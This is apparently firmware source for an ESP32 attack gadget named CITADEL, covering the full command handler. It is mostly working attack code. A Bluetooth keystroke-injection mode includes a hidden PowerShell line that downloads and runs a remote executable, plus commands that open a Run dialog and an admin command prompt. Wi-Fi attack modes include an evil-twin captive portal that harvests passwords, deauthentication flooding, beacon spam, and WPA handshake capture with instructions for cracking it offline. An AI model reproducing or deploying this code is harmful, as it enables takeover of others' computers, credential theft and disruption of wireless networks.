// ==========================================================
//   CITADEL v2.0.0 — CIT_V_2_0_0
//   File 04: Command Engine — runCommand() (all namespaces)
// ==========================================================

String runCommand(String raw) {
  burstClock();
  raw.trim();
  if (raw == "") return "";

  // Check aliases first
  String upRaw = raw; upRaw.toUpperCase();
  for (int i = 0; i < aliasCount; i++) {
    if (upRaw == aliases[i].alias) {
      raw = aliases[i].command;
      upRaw = raw; upRaw.toUpperCase();
      addLog("[ALIAS] " + aliases[i].alias + "  " + raw);
      break;
    }
  }

  String up = raw; up.toUpperCase();
  oledLastCmd = raw.substring(0, 17);
  String result = "";

  //  LEGACY ALIASES 
  if (up == "SCAN")     { result = runCommand("WIFI SCAN");   result += "<br><span class='yw'>TIP: use WIFI SCAN</span>";   goto done; }
  if (up == "STATUS")   { result = runCommand("WIFI STATUS"); result += "<br><span class='yw'>TIP: use WIFI STATUS</span>"; goto done; }
  if (up == "TOP")      { result = runCommand("SYS TOP");     result += "<br><span class='yw'>TIP: use SYS TOP</span>";     goto done; }
  if (up == "STEALTH")  { result = runCommand("SYS STEALTH"); result += "<br><span class='yw'>TIP: use SYS STEALTH</span>"; goto done; }
  if (up == "CLS")      { result = runCommand("SYS CLEAR");   result += "<br><span class='yw'>TIP: use SYS CLEAR</span>";   goto done; }
  if (up == "REBOOT")   { return runCommand("SYS REBOOT"); }
  if (up == "RICKROLL") { result = runCommand("BT RICKROLL"); result += "<br><span class='yw'>TIP: use BT RICKROLL</span>"; goto done; }
  if (up.startsWith("SAY "))  { result = runCommand("BT TYPE " + raw.substring(4));  result += "<br><span class='yw'>TIP: use BT TYPE</span>";  goto done; }
  if (up.startsWith("VOLT ")) { result = runCommand("SYS FREQ " + raw.substring(5)); result += "<br><span class='yw'>TIP: use SYS FREQ</span>"; goto done; }

  if (up == "HISTORY") {
    result = "<span class='cy'> COMMAND HISTORY </span><br>";
    String lines[20]; int count = 0;
    String log = terminalLog;
    int pos = log.lastIndexOf("\n", log.length()-2);
    while (pos >= 0 && count < 20) {
      int prev = log.lastIndexOf("\n", pos-1);
      String line = log.substring(prev+1, pos);
      if (line.length() > 0) { lines[count++] = line; }
      pos = prev;
    }
    for (int i = count-1; i >= 0; i--) result += String(count-i) + ". " + htmlEncode(lines[i]) + "<br>";
    goto done;
  }

  if (up.startsWith("ALIAS")) {
    String sub = raw.length() > 6 ? raw.substring(6) : "";
    String subUp = sub; subUp.toUpperCase(); subUp.trim();
    if (subUp == "LIST") {
      if (aliasCount == 0) { result = "NO ALIASES SET."; goto done; }
      result = "<span class='cy'> ALIASES </span><br>";
      for (int i = 0; i < aliasCount; i++)
        result += "<span class='yw'>" + aliases[i].alias + "</span>  " + aliases[i].command + "<br>";
      goto done;
    }
    if (subUp.startsWith("DELETE ")) {
      String a = parseQuotedArg(sub.substring(7), 0); a.toUpperCase();
      for (int i = 0; i < aliasCount; i++) {
        if (aliases[i].alias == a) {
          for (int j = i; j < aliasCount-1; j++) aliases[j] = aliases[j+1];
          aliasCount--; saveAliases();
          result = "ALIAS DELETED: " + a; goto done;
        }
      }
      result = "<span class='er'>ALIAS NOT FOUND.</span>"; goto done;
    }
    // ALIAS "shortcut" "full command"
    String a = parseQuotedArg(sub, 0); a.toUpperCase();
    String c = parseQuotedArg(sub, 1);
    if (a == "" || c == "") { result = "<span class='er'>FORMAT: ALIAS \"shortcut\" \"full command\"</span>"; goto done; }
    if (aliasCount >= MAX_ALIASES) { result = "<span class='er'>MAX ALIASES REACHED.</span>"; goto done; }
    aliases[aliasCount] = {a, c}; aliasCount++;
    saveAliases();
    result = "ALIAS SET: " + a + "  " + c; goto done;
  }

  //  WIFI 
  if (up.startsWith("WIFI")) {
    String sub = raw.length() > 5 ? raw.substring(5) : "";
    String subUp = sub; subUp.toUpperCase(); subUp.trim();

    if (subUp == "STATUS") {
      result = "<span class='cy'> NETWORK STATUS </span><br>"
               "AP:    " + apName + " @ " + WiFi.softAPIP().toString() + "<br>"
               "PASS:  " + apPass + "<br>"
               "STA:   " + (staConnected ? WiFi.SSID() + " @ " + WiFi.localIP().toString() : "NOT CONNECTED") + "<br>"
               "HOST:  citadel.local<br>"
               "SNIFF: " + String(sniffing ? "ON" : "OFF");
      goto done;
    }
    if (subUp == "SCAN") {
      result = "<span class='cy'> RADAR </span><br>";
      int n = WiFi.scanNetworks();
      if (n == 0) { result += "NO NETWORKS FOUND."; goto done; }
      for (int i = 0; i < n; i++) {
        result += String(i+1) + ": <span class='yw'>" + htmlEncode(WiFi.SSID(i)) + "</span>"
               + " [" + String(WiFi.RSSI(i)) + "dBm]"
               + " BSSID:" + WiFi.BSSIDstr(i)
               + " CH:" + String(WiFi.channel(i)) + " "
               + (WiFi.encryptionType(i)==WIFI_AUTH_OPEN ? "<span class='yw'>OPEN</span>" : "SECURE")
               + "<br>";
      }
      WiFi.scanDelete();
      goto done;
    }
    if (subUp == "IP") {
      result = "AP:  " + WiFi.softAPIP().toString() + "<br>"
               "STA: " + (staConnected ? WiFi.localIP().toString() : "N/A");
      goto done;
    }
    if (subUp == "DISCONNECT") { WiFi.disconnect(); staConnected = false; result = "STA DISCONNECTED."; goto done; }
    if (subUp == "FORGET") {
      prefs.putString("sta_ssid",""); prefs.putString("sta_pass","");
      staSSID=""; staPass=""; WiFi.disconnect(); staConnected=false;
      result = "CREDENTIALS WIPED."; goto done;
    }
    if (subUp == "CLIENTS") {
      wifi_sta_list_t sl; esp_wifi_ap_get_sta_list(&sl);
      result = "<span class='cy'> AP CLIENTS </span><br>";
      if (sl.num == 0) { result += "NONE"; goto done; }
      for (int i = 0; i < sl.num; i++) {
        char mac[18];
        snprintf(mac,sizeof(mac),"%02X:%02X:%02X:%02X:%02X:%02X",
          sl.sta[i].mac[0],sl.sta[i].mac[1],sl.sta[i].mac[2],
          sl.sta[i].mac[3],sl.sta[i].mac[4],sl.sta[i].mac[5]);
        result += String(i+1) + ": " + mac + "<br>";
      }
      goto done;
    }
    if (subUp=="SNIFF ON")  { sniffing=true;  result="SNIFF: ACTIVE";  goto done; }
    if (subUp=="SNIFF OFF") { sniffing=false; result="SNIFF: STOPPED"; goto done; }
    if (subUp=="AP ON")     { WiFi.softAP(apName.c_str(),apPass.c_str()); result="AP ON.";  goto done; }
    if (subUp=="AP OFF")    { WiFi.softAPdisconnect(true); result="AP OFF."; goto done; }
    if (subUp.startsWith("AP NAME ")) {
      String n = parseQuotedArg(sub.substring(8),0);
      if (n=="") { result="<span class='er'>FORMAT: WIFI AP NAME \"name\"</span>"; goto done; }
      apName=n; prefs.putString("ap_name",apName);
      WiFi.softAP(apName.c_str(),apPass.c_str());
      result="AP RENAMED: "+apName; goto done;
    }
    if (subUp.startsWith("AP PASS ")) {
      String p = parseQuotedArg(sub.substring(8),0);
      if (p.length()<8) { result="<span class='er'>MIN 8 CHARS.</span>"; goto done; }
      apPass=p; prefs.putString("ap_pass",apPass);
      WiFi.softAP(apName.c_str(),apPass.c_str());
      result="AP PASSWORD UPDATED."; goto done;
    }
    if (subUp.startsWith("CONNECT ")) {
      String s = parseQuotedArg(sub.substring(8),0);
      String p = parseQuotedArg(sub.substring(8),1);
      if (s=="") { result="<span class='er'>FORMAT: WIFI CONNECT \"SSID\" \"PASS\"</span>"; goto done; }
      staSSID=s; staPass=p;
      prefs.putString("sta_ssid",staSSID); prefs.putString("sta_pass",staPass);
      staConnected=false; WiFi.begin(staSSID.c_str(),staPass.c_str());
      result="CONNECTING TO: "+htmlEncode(staSSID)+"...<br>Check WIFI STATUS in ~10s."; goto done;
    }
    result="<span class='er'>UNKNOWN WIFI COMMAND. Type HELP WIFI.</span>"; goto done;
  }

  //  BT 
  if (up.startsWith("BT")) {
    String sub = raw.length()>3 ? raw.substring(3) : "";
    String subUp = sub; subUp.toUpperCase(); subUp.trim();

    if (subUp=="ON") {
      if (currentHealth==HEALTH_RED) { result="<span class='er'>SYSTEM RED. Free memory before starting BT.</span>"; goto done; }
      if (currentHealth==HEALTH_ORANGE) addLog("[BT] WARN: ORANGE health. BT may be unstable.");
      startBle();
      result="BT ACTIVE. Pairing as: <span class='yw'>"+btName+"</span><br>"
             "Heap: "+String(ESP.getFreeHeap()/1024)+"KB<br>"
             "Kill: <span class='yw'>BT OFF</span>";
      goto done;
    }
    if (subUp=="OFF") { stopBle(); result="BT OFF. Memory freed."; goto done; }
    if (subUp=="STATUS") {
      bool paired = btActive && bleIsConnected();
      result="BT: "+(btActive?String("ON"):String("OFF"))+"<br>";
      if (btActive) result+="NAME:   "+btName+"<br>PAIRED: "+(paired?"YES":"WAITING");
      result+="<br>HEAP:   "+String(ESP.getFreeHeap()/1024)+"KB";
      goto done;
    }
    if (subUp=="PAIR") {
      if (!btActive) { result="<span class='er'>Run BT ON first.</span>"; goto done; }
      oledDraw("BT PAIR MODE",btName,"WAITING...");
      result="<span class='cy'>PAIRING AS: "+btName+"</span><br>"
             "1. On target: open Bluetooth settings<br>"
             "2. Select: "+btName+"<br>"
             "3. Confirm pairing code if prompted<br>"
             "OLED showing pairing status.";
      goto done;
    }
    if (subUp.startsWith("NAME ")) {
      String n=parseQuotedArg(sub.substring(5),0);
      if (n=="") { result="<span class='er'>FORMAT: BT NAME \"name\"</span>"; goto done; }
      btName=n; prefs.putString("bt_name",btName);
      if (btActive) { stopBle(); startBle(); }
      result="BT RENAMED: "+btName+(btActive?" (restarted)":""); goto done;
    }

    if (!btActive || !bleIsConnected()) {
      result="<span class='er'>NOT PAIRED. Run BT ON and pair device first.</span>"; goto done;
    }

    if (subUp.startsWith("TYPE ")) {
      String t=parseQuotedArg(sub.substring(5),0);
      if (t=="") { result="<span class='er'>FORMAT: BT TYPE \"text\"</span>"; goto done; }
      btTypeText(t,50,"NORMAL");
      result="TYPED: "+String(t.length())+" chars."; goto done;
    }
    if (subUp.startsWith("NOTE")) {
      String nArgs=sub.length()>5?sub.substring(5):"";
      String nUp=nArgs; nUp.toUpperCase(); nUp.trim();
      if (nUp.startsWith("SAVE ")) {
        String fname=parseQuotedArg(nArgs.substring(5),0);
        if (fname=="") { result="<span class='er'>FORMAT: BT NOTE SAVE \"filename\"</span>"; goto done; }
        blePress(KEY_LEFT_CTRL); blePress('s'); delay(100); bleReleaseAll();
        safeDelay(900); blePrint(fname); bleWrite(KEY_RETURN);
        result="SAVED: "+fname; goto done;
      }
      bool doMax=nUp.startsWith("FULL"), doClean=nUp.startsWith("CLEAN");
      String t=parseQuotedArg(nArgs.substring(doMax||doClean?(doClean?6:5):0),0);
      if (t=="") { result="<span class='er'>FORMAT: BT NOTE \"text\"</span>"; goto done; }
      btOpenNotepad(doMax||doClean,doClean); btTypeText(t,50,"NORMAL");
      result="NOTEPAD: DONE."; goto done;
    }
    if (subUp.startsWith("SAY")) {
      String sArgs=sub.length()>4?sub.substring(4):""; sArgs.trim();
      String t=parseQuotedArg(sArgs,0);
      String spd=parseQuotedArg(sArgs,1); spd.toUpperCase(); if(spd=="")spd="NORMAL";
      String sty=parseQuotedArg(sArgs,2); sty.toUpperCase(); if(sty=="")sty="NORMAL";
      String win=parseQuotedArg(sArgs,3); win.toUpperCase(); if(win=="")win="CURRENT";
      if (t=="") { result="<span class='cy'>BT SAY  Type HELP BT SAY for usage.</span>"; goto done; }
      if (win=="NOTEPAD")           btOpenNotepad(false,false);
      else if (win=="NOTEPAD+FULL") btOpenNotepad(true,false);
      else if (win=="MINIMIZE+NOTEPAD") btOpenNotepad(true,true);
      btTypeText(t,btTypingDelay(spd),sty);
      result="SENT: "+String(t.length())+" chars ["+spd+"]["+sty+"]"; goto done;
    }
    if (subUp=="LOCK")     { blePress(KEY_LEFT_GUI); blePress('l'); delay(100); bleReleaseAll(); result="LOCKED."; goto done; }
    if (subUp=="MUTE")     { bleWrite(KEY_MEDIA_MUTE);        result="MUTED.";  goto done; }
    if (subUp=="VOL UP")   { bleWrite(KEY_MEDIA_VOLUME_UP);   result="VOL +.";  goto done; }
    if (subUp=="VOL DOWN") { bleWrite(KEY_MEDIA_VOLUME_DOWN); result="VOL -.";  goto done; }
    if (subUp=="SCREENSHOT") { blePress(KEY_LEFT_GUI); blePress(KEY_PRTSC); delay(100); bleReleaseAll(); result="SCREENSHOT."; goto done; }
    if (subUp=="MINALL")   { blePress(KEY_LEFT_GUI); blePress('d'); delay(100); bleReleaseAll(); result="MINIMIZED ALL."; goto done; }
    if (subUp.startsWith("SEARCH ")) {
      String q=parseQuotedArg(sub.substring(7),0);
      blePress(KEY_LEFT_GUI); blePress('s'); delay(200); bleReleaseAll();
      safeDelay(600); blePrint(q);
      result="SEARCHED: "+q; goto done;
    }
    if (subUp.startsWith("URL ")) {
      String url=parseQuotedArg(sub.substring(4),0);
      blePress(KEY_LEFT_GUI); blePress('r'); delay(200); bleReleaseAll();
      safeDelay(700); blePrint(url); bleWrite(KEY_RETURN);
      result="URL OPENED: "+url; goto done;
    }
    if (subUp.startsWith("SHELL ")) {
      String cmd=parseQuotedArg(sub.substring(6),0);
      blePress(KEY_LEFT_GUI); blePress('r'); delay(200); bleReleaseAll();
      safeDelay(700); blePrint(cmd); bleWrite(KEY_RETURN);
      result="SHELL: "+cmd; goto done;
    }
    if (subUp=="ADMIN") {
      blePress(KEY_LEFT_GUI); blePress('r'); delay(200); bleReleaseAll();
      safeDelay(700);
      blePrint("cmd"); blePress(KEY_LEFT_CTRL); blePress(KEY_LEFT_SHIFT);
      bleWrite(KEY_RETURN); bleReleaseAll();
      safeDelay(800);
      bleWrite(KEY_LEFT_ARROW); bleWrite(KEY_RETURN);
      result="ADMIN CMD OPENED."; goto done;
    }
    if (subUp=="RICKROLL") {
      blePress(KEY_LEFT_GUI); blePress('r'); delay(200); bleReleaseAll();
      safeDelay(900); blePrint("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
      bleWrite(KEY_RETURN); result="NEVER GONNA GIVE YOU UP."; goto done;
    }
    if (subUp.startsWith("MATRIX")) {
      int cnt=80; String cs=sub.length()>7?sub.substring(7):""; cs.trim();
      if (cs.length()>0) cnt=cs.toInt(); cnt=constrain(cnt,1,500);
      for (int i=0;i<cnt;i++) { if(emergencyKill)break; bleWrite((uint8_t)('a'+random(26))); safeDelay(25); }
      result="MATRIX: "+String(cnt)+" CHARS."; goto done;
    }
    if (subUp.startsWith("DOWNLOAD ")) {
      String url=parseQuotedArg(sub.substring(9),0);
      if (url=="") { result="<span class='er'>FORMAT: BT DOWNLOAD \"url\"</span>"; goto done; }
      blePress(KEY_LEFT_GUI); blePress('r'); delay(200); bleReleaseAll();
      safeDelay(700);
      blePrint("powershell -w hidden -c \"iwr '" + url + "' -OutFile $env:TEMP\\run.exe; Start-Process $env:TEMP\\run.exe\"");
      bleWrite(KEY_RETURN);
      result="DOWNLOAD PAYLOAD SENT."; goto done;
    }
    if (subUp.startsWith("PAYLOAD")) {
      String pArgs=sub.length()>8?sub.substring(8):""; pArgs.trim();
      String pUp=pArgs; pUp.toUpperCase();
      if (pUp=="LIST") {
        if (payloadCount==0) { result="NO PAYLOADS SAVED."; goto done; }
        result="<span class='cy'> PAYLOADS </span><br>";
        for (int i=0;i<payloadCount;i++)
          result+=String(i+1)+": <span class='yw'>"+payloads[i].name+"</span> ("+String(payloads[i].stepCount)+" steps)<br>";
        goto done;
      }
      if (pUp.startsWith("RUN ")) {
        String n=parseQuotedArg(pArgs.substring(4),0);
        for (int i=0;i<payloadCount;i++) {
          if (payloads[i].name==n) { btRunPayload(i); result="PAYLOAD DONE: "+n; goto done; }
        }
        result="<span class='er'>PAYLOAD NOT FOUND: "+n+"</span>"; goto done;
      }
      if (pUp.startsWith("DELETE ")) {
        String n=parseQuotedArg(pArgs.substring(7),0);
        for (int i=0;i<payloadCount;i++) {
          if (payloads[i].name==n) {
            for (int j=i;j<payloadCount-1;j++) payloads[j]=payloads[j+1];
            payloadCount--; savePayloads();
            result="DELETED: "+n; goto done;
          }
        }
        result="<span class='er'>NOT FOUND.</span>"; goto done;
      }
      if (pUp.startsWith("NEW ")) {
        if (payloadCount>=MAX_PAYLOADS) { result="<span class='er'>MAX PAYLOADS REACHED.</span>"; goto done; }
        String n=parseQuotedArg(pArgs.substring(4),0);
        if (n=="") { result="<span class='er'>FORMAT: BT PAYLOAD NEW \"name\"</span>"; goto done; }
        recordingIndex=payloadCount; payloadCount++;
        payloads[recordingIndex].name=n; payloads[recordingIndex].stepCount=0;
        recordingPayload=true;
        result="RECORDING: "+n+"<br>Add steps with BT PAYLOAD STEP<br>Done: BT PAYLOAD SAVE"; goto done;
      }
      if (pUp.startsWith("STEP ") && recordingPayload && recordingIndex>=0) {
        String step=parseQuotedArg(pArgs.substring(5),0);
        int d=parseQuotedArg(pArgs.substring(5),1).toInt();
        int sc=payloads[recordingIndex].stepCount;
        if (sc<32) { payloads[recordingIndex].steps[sc]=step; payloads[recordingIndex].delays[sc]=d; payloads[recordingIndex].stepCount++; }
        result="STEP "+String(payloads[recordingIndex].stepCount)+": "+step; goto done;
      }
      if (pUp=="SAVE" && recordingPayload) {
        recordingPayload=false; savePayloads();
        result="PAYLOAD SAVED: "+payloads[recordingIndex].name+" ("+String(payloads[recordingIndex].stepCount)+" steps)";
        recordingIndex=-1; goto done;
      }
      if (pUp.startsWith("VIEW ")) {
        String n=parseQuotedArg(pArgs.substring(5),0);
        for (int i=0;i<payloadCount;i++) {
          if (payloads[i].name==n) {
            result="<span class='cy'> PAYLOAD: "+n+" </span><br>";
            for (int j=0;j<payloads[i].stepCount;j++)
              result+=String(j+1)+": "+payloads[i].steps[j]+" (delay:"+String(payloads[i].delays[j])+"ms)<br>";
            goto done;
          }
        }
        result="<span class='er'>NOT FOUND.</span>"; goto done;
      }
      result="<span class='er'>UNKNOWN PAYLOAD CMD. Type HELP BT PAYLOAD.</span>"; goto done;
    }
    result="<span class='er'>UNKNOWN BT COMMAND. Type HELP BT.</span>"; goto done;
  }

  //  ATTACK 
  if (up.startsWith("ATTACK")) {
    String sub=raw.length()>7?raw.substring(7):"";
    String subUp=sub; subUp.toUpperCase(); subUp.trim();

    if (subUp=="STOP") { killAllAttacks(false); result="<span class='yw'>ALL ATTACKS STOPPED.</span><br>Heap: "+String(ESP.getFreeHeap()/1024)+"KB"; goto done; }

    if (subUp=="STATUS") {
      result="<span class='cy'> ATTACK STATUS </span><br>"
             "EVIL TWIN: "+(evilTwinActive?"<span class='yw'>ON  "+evilTwinSSID+"</span>":"OFF")+"<br>"
             "CAPTURES:  "+String(captureCount)+"<br>"
             "DEAUTH:    "+(deauthActive?(deauthContinuous?"CONTINUOUS":"SINGLE"):"OFF")+"<br>"
             "BEACON:    "+(beaconSpamActive?"ON":"OFF")+"<br>"
             "HANDSHAKE: "+(captureHandshake?"LISTENING":(handshakeGot?"CAPTURED":"OFF"))+"<br>"
             "THEME:     "+captiveTheme+"<br>"
             "HEALTH:    "+healthName(currentHealth);
      goto done;
    }

    if (subUp=="SCAN") {
      result="<span class='cy'> ATTACK SCAN </span><br>";
      int n=WiFi.scanNetworks();
      if (n==0) { result+="NO NETWORKS FOUND."; goto done; }
      for (int i=0;i<n;i++) {
        result+=String(i+1)+": <span class='yw'>"+htmlEncode(WiFi.SSID(i))+"</span>"
               +" BSSID:<span class='cy'>"+WiFi.BSSIDstr(i)+"</span>"
               +" CH:"+String(WiFi.channel(i))
               +" "+String(WiFi.RSSI(i))+"dBm"
               +(WiFi.encryptionType(i)==WIFI_AUTH_OPEN?" <span class='yw'>OPEN</span>":" WPA2")
               +"<br>";
      }
      WiFi.scanDelete();
      result+="<br>Copy BSSID for ATTACK DEAUTH command."; goto done;
    }

    if (subUp.startsWith("EVILTWIN")) {
      String arg=parseQuotedArg(sub.substring(8),0);
      if (arg=="") { result="<span class='er'>FORMAT: ATTACK EVILTWIN \"SSID\"</span>"; goto done; }
      if (arg=="OFF") { stopEvilTwin(); result="EVIL TWIN OFF. AP RESTORED."; goto done; }
      startEvilTwin(arg);
      result="<span class='yw'>EVIL TWIN ACTIVE: "+arg+"</span><br>"
             "Open AP  no password required<br>"
             "Captive portal: auto-detects Android/iOS/Windows<br>"
             "New captures print to terminal instantly<br>"
             "Kill: <span class='yw'>ATTACK EVILTWIN OFF</span> or <span class='yw'>ATTACK STOP</span>";
      goto done;
    }

    if (subUp=="CREDS") {
      if (captureCount==0) { result="NO CREDENTIALS CAPTURED."; goto done; }
      result="<span class='cy'> CAPTURES ("+String(captureCount)+") </span><br>"+htmlEncode(capturedCreds);
      goto done;
    }
    if (subUp=="CREDS CLEAR") { capturedCreds=""; captureCount=0; result="CREDS CLEARED."; goto done; }

    if (subUp.startsWith("THEME ")) {
      String t=parseQuotedArg(sub.substring(6),0); t.toLowerCase();
      if (t!="auto"&&t!="android"&&t!="ios"&&t!="windows") { result="<span class='er'>OPTIONS: auto android ios windows</span>"; goto done; }
      captiveTheme=t; result="PORTAL THEME: "+t; goto done;
    }

    if (subUp.startsWith("DEAUTH")) {
      String dArgs=sub.length()>7?sub.substring(7):""; dArgs.trim();
      String dUp=dArgs; dUp.toUpperCase();
      if (dUp=="OFF") { deauthActive=false; deauthContinuous=false; result="DEAUTH STOPPED."; goto done; }
      String bssidStr=parseQuotedArg(dArgs,0);
      String clientStr=parseQuotedArg(dArgs,1);
      bool continuous=dUp.indexOf("CONTINUOUS")>=0;
      if (bssidStr=="") { result="<span class='er'>FORMAT: ATTACK DEAUTH \"BSSID\" [\"CLIENT\"|CONTINUOUS]</span>"; goto done; }
      uint8_t bssid[6],client[6];
      sscanf(bssidStr.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&bssid[0],&bssid[1],&bssid[2],&bssid[3],&bssid[4],&bssid[5]);
      if (continuous) {
        deauthActive=true; deauthContinuous=true;
        memcpy(&deauthFrame[10],bssid,6); memcpy(&deauthFrame[16],bssid,6);
        uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        memcpy(&deauthFrame[4],bc,6);
        result="<span class='yw'>DEAUTH CONTINUOUS: "+bssidStr+"</span><br>Kill: <span class='yw'>ATTACK DEAUTH OFF</span>";
      } else {
        if (clientStr==""||clientStr=="FF:FF:FF:FF:FF:FF") {
          uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
          for (int i=0;i<10;i++) { if(emergencyKill)break; sendDeauth(bssid,bc); safeDelay(50); }
          result="DEAUTH BROADCAST x10 SENT.";
        } else {
          sscanf(clientStr.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&client[0],&client[1],&client[2],&client[3],&client[4],&client[5]);
          for (int i=0;i<10;i++) { if(emergencyKill)break; sendDeauth(bssid,client); safeDelay(50); }
          result="DEAUTH x10  "+clientStr;
        }
      }
      addAttackLog("DEAUTH: "+bssidStr+(continuous?" CONTINUOUS":" BURST"));
      goto done;
    }

    if (subUp.startsWith("BEACON")) {
      String bArgs=sub.length()>7?sub.substring(7):""; bArgs.trim();
      String bUp=bArgs; bUp.toUpperCase();
      if (bUp=="OFF") { beaconSpamActive=false; result="BEACON STOPPED."; goto done; }
      String ssid=parseQuotedArg(bArgs,0);
      int cnt=parseQuotedArg(bArgs,1).toInt(); if(cnt<=0)cnt=10; cnt=constrain(cnt,1,100);
      if (ssid=="") { result="<span class='er'>FORMAT: ATTACK BEACON \"SSID\" [count]</span>"; goto done; }
      uint8_t beacon[128]; memset(beacon,0,sizeof(beacon));
      beacon[0]=0x80; beacon[1]=0x00;
      for(int i=10;i<22;i++) beacon[i]=0xFF;
      beacon[36]=0x64; beacon[37]=0x00; beacon[38]=0x01; beacon[39]=0x04;
      beacon[40]=0x00; int slen=ssid.length(); beacon[41]=slen;
      for(int i=0;i<slen;i++) beacon[42+i]=ssid[i];
      int flen=42+slen;
      esp_wifi_set_promiscuous(true);
      for(int i=0;i<cnt;i++) { if(emergencyKill)break; esp_wifi_80211_tx(WIFI_IF_AP,beacon,flen,false); safeDelay(5); }
      esp_wifi_set_promiscuous(false);
      result="BEACON: "+String(cnt)+"x \""+ssid+"\" SENT.<br>Kill: <span class='yw'>ATTACK BEACON OFF</span>";
      addAttackLog("BEACON: "+ssid+" x"+String(cnt)); goto done;
    }

    if (subUp.startsWith("HANDSHAKE")) {
      String hArgs=sub.length()>10?sub.substring(10):""; hArgs.trim();
      String hUp=hArgs; hUp.toUpperCase();
      if (hUp=="OFF") { captureHandshake=false; result="HANDSHAKE CAPTURE OFF."; goto done; }
      if (hUp=="SHOW") {
        if (!handshakeGot) { result="NO HANDSHAKE CAPTURED YET."; goto done; }
        result="<span class='cy'> HANDSHAKE </span><br>TARGET: "+handshakeTarget+"<br>DATA: "+htmlEncode(handshakeHex)+"<br>Use hashcat with -m 22000 to crack offline."; goto done;
      }
      String target=parseQuotedArg(hArgs,0);
      handshakeTarget=target; captureHandshake=true; handshakeGot=false; handshakeHex="";
      esp_wifi_set_promiscuous(true);
      result="<span class='yw'>HANDSHAKE CAPTURE ON</span><br>"
             "Target: "+(target==""?"ANY":target)+"<br>"
             "Combine with ATTACK DEAUTH to force reconnect<br>"
             "Kill: <span class='yw'>ATTACK HANDSHAKE OFF</span>";
      addAttackLog("HANDSHAKE CAPTURE START: "+(target==""?"ANY":target)); goto done;
    }

    if (subUp=="LOG") {
      result = attackLog=="" ? "NO ATTACK LOG." : "<span class='cy'> ATTACK LOG </span><br>"+htmlEncode(attackLog);
      goto done;
    }
    if (subUp=="CLIENTS") {
      wifi_sta_list_t sl; esp_wifi_ap_get_sta_list(&sl);
      result="<span class='cy'> EVIL TWIN CLIENTS </span><br>";
      if (!evilTwinActive) { result+="Evil twin not active."; goto done; }
      if (sl.num==0) { result+="NONE YET."; goto done; }
      for(int i=0;i<sl.num;i++) {
        char mac[18]; snprintf(mac,sizeof(mac),"%02X:%02X:%02X:%02X:%02X:%02X",sl.sta[i].mac[0],sl.sta[i].mac[1],sl.sta[i].mac[2],sl.sta[i].mac[3],sl.sta[i].mac[4],sl.sta[i].mac[5]);
        result+=String(i+1)+": "+mac+"<br>";
      }
      goto done;
    }

    result="<span class='er'>UNKNOWN ATTACK COMMAND. Type HELP ATTACK.</span>"; goto done;
  }

  // SYS, AUTH, OTA, HELP commands follow

  //  SYS 
  if (up.startsWith("SYS")) {
    String sub   = raw.length()>4 ? raw.substring(4) : "";
    String subUp = sub; subUp.toUpperCase(); subUp.trim();

    if (subUp=="TOP") {
      float t=getTemp();
      result="CPU:     "+String(currentFreq)+"MHz<br>"
             "TEMP:    "+String(t,1)+"C<br>"
             "HEAP:    "+String(ESP.getFreeHeap()/1024)+"KB free<br>"
             "MIN HEAP:"+String(ESP.getMinFreeHeap()/1024)+"KB<br>"
             "THROTTLE:"+String(thermalThrottled?" YES (!)":" NO")+"<br>"
             "HEALTH:  "+healthName(currentHealth);
      goto done;
    }
    if (subUp=="HEALTH") {
      result="<span class='cy'> SYSTEM HEALTH </span><br>"
             "STATE: <span style='color:"+healthColor(currentHealth)+"'>"+healthName(currentHealth)+"</span><br>"
             "HEAP:  "+String(ESP.getFreeHeap()/1024)+"KB free<br>"
             "GREEN  &gt;120KB  all services safe<br>"
             "YELLOW 80-120KB  monitor usage<br>"
             "ORANGE 50-80KB   stop non-essential<br>"
             "RED    &lt;50KB   emergency kill auto-fires";
      goto done;
    }
    if (subUp=="UPTIME")  { result="UPTIME: "+getUptime(); goto done; }
    if (subUp=="VERSION") { result="CITADEL v2.0.0 [CLDTX6]"; goto done; }
    if (subUp=="CLEAR")   { terminalLog=""; result="CLEARED."; goto done; }
    if (subUp=="REBOOT")  { server.send(200,"text/plain","REBOOTING..."); delay(500); ESP.restart(); return ""; }

    if (subUp=="MEMORY") {
      result="FREE:      "+String(ESP.getFreeHeap()/1024)+"KB<br>"
             "MIN FREE:  "+String(ESP.getMinFreeHeap()/1024)+"KB<br>"
             "MAX ALLOC: "+String(ESP.getMaxAllocHeap()/1024)+"KB<br>"
             "FLASH:     "+String(ESP.getFlashChipSize()/1024)+"KB<br>"
             "SKETCH:    "+String(ESP.getSketchSize()/1024)+"KB used<br>"
             "FREE SKETCH:"+String(ESP.getFreeSketchSpace()/1024)+"KB";
      goto done;
    }
    if (subUp=="THERMAL") {
      result="TEMP:     "+String(getTemp(),1)+"C<br>"
             "THROTTLE AT: 75.0C  80MHz<br>"
             "RECOVER AT:  60.0C  240MHz<br>"
             "STATE:    "+String(thermalThrottled?"THROTTLED":"NORMAL")+"<br>"
             "HISTORY (last 10):<br>";
      for (int i=0;i<10;i++) {
        int idx=(thermalHistoryIdx-10+i+60)%60;
        result+=String(thermalHistory[idx],1)+"C ";
      }
      goto done;
    }
    if (subUp=="STORAGE") {
      result="<span class='cy'> STORAGE </span><br>"
             "PAYLOADS: "+String(payloadCount)+"/"+String(MAX_PAYLOADS)+"<br>"
             "ALIASES:  "+String(aliasCount)+"/"+String(MAX_ALIASES)+"<br>"
             "ACCOUNTS: "+String(accountCount)+"/"+String(MAX_ACCOUNTS)+"<br>"
             "FLASH:    "+String(ESP.getFlashChipSize()/1024)+"KB total<br>"
             "SKETCH:   "+String(ESP.getSketchSize()/1024)+"KB used<br>"
             "SKETCH FREE: "+String(ESP.getFreeSketchSpace()/1024)+"KB";
      goto done;
    }
    if (subUp=="PREFS") {
      result="<span class='cy'> SAVED PREFERENCES </span><br>"
             "AP NAME:   "+apName+"<br>"
             "AP PASS:   "+apPass+"<br>"
             "BT NAME:   "+btName+"<br>"
             "STA SSID:  "+(staSSID!=""?staSSID:"(none)")+"<br>"
             "AUTH:      "+String(authEnabled?"ENABLED":"DISABLED")+"<br>"
             "TIMEOUT:   "+String(authTimeout)+" min<br>"
             "AUTORENEW: "+String(authAutoRenew?"ON":"OFF")+"<br>"
             "NTP OFFSET:"+String(ntpOffset)+"<br>"
